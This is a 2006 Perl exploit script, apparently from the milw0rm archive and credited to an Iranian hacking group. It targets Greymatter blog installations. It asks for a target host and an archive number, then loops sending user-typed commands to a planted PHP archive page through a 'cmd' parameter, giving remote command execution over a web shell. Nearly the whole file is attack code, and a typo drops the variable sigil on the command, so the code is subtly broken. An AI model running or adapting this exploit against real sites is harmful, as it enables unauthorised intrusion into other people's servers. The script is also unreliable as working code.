#!/usr/bin/perl
#
# Exploit by Hessam-x (www.hessamx.net)
# Special Thanx : Vampire , s3rv3r_hack3r
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /  #
# \___|_  /(____  )\___  >__|_ \\___  >__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
#                 DeltaHAcking Team                  #
#           website: www.deltahacking.com            #
######################################################
# Name    : Greymatter                               #
# Site    : http://www.noahgrey.com/greysoft/        #
######################################################
# example:
# target : www.yesite.com/Greymatter/
# archive number : 00000141
use LWP::Simple;


print "-------------------------------------------\n";
print "=                 Greymatter              =\n";
print "=       By Hessam-x  - www.hackerz.ir     =\n";
print "=   Vampire      - www.deltahacking.com   =\n"; 
print "-------------------------------------------\n\n";


      print "Target >http://";
      chomp($targ = <STDIN>);
      print "archive number >";
      chomp($arnum= <STDIN>);
   
   $con=get("http://".$targ) || die "[-]Cannot connect to Host"; 
while ()  
{  
     print "Hessam-x@Greymatter \$";
     chomp($comd=<STDIN>);
     $commd=get("http://".$targ."archives/".$arnum.".php?cmd=".comd)
}

# milw0rm.com [2006-03-28]
